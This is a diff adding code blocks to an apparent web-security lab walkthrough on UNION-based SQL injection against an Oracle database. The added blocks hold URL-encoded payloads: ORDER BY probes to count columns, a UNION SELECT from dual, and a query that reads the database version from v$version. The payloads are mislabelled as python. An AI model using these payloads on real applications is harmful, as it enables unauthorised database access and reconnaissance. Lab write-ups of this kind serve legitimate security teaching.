@@ -45,6 +45,12 @@ In this lab, we determine that the query contains two columns.
   <img src="/assets/css/img/SQL/sql1.png" alt="SQLi" />
 </p>
 
+```python
+Gifts'+ORDER+BY+1+--
+Gifts'+ORDER+BY+2+--
+Gifts'+ORDER+BY+3+--
+```
+
 ## Step 3 – Check Compatible Data Types
 
 The next task is to determine which columns can contain string values.
@@ -59,6 +65,10 @@ Since the lab uses Oracle Database, every SELECT statement must include a FROM c
   <img src="/assets/css/img/SQL/sql3.png" alt="SQLi" />
 </p>
 
+```python
+Gifts'+UNION+SELECT+'Hack','live'+FROM+dual+--
+```
+
 ## Step 4 – Retrieve Database Version
 
 Once the query structure has been defined, you can query the v$version view, which contains information about the Oracle Database version.
@@ -72,3 +82,7 @@ After executing the query, the application displays the database version string,
 <p align="center">
   <img src="/assets/css/img/SQL/sql4.png" alt="SQLi" />
 </p>
+
+```python
+Gifts'+UNION+SELECT+banner,+null+FROM+v$version+--
+```
